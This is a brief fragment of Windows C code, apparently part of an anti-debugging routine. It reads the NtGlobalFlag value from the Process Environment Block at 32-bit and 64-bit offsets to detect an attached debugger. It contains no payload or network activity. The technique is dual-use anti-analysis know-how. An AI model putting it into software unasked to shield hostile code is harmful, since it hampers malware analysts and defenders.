        return FALSE;

    /* Check 2: NtGlobalFlag -- debuggers often set 0x70 (FLG_HEAP_*) */
#if defined(_WIN64)
    DWORD ntGlobalFlag = *(DWORD*)((PBYTE)pPeb + 0xBC);
#else
    DWORD ntGlobalFlag = *(DWORD*)((PBYTE)pPeb + 0x68);
#endif
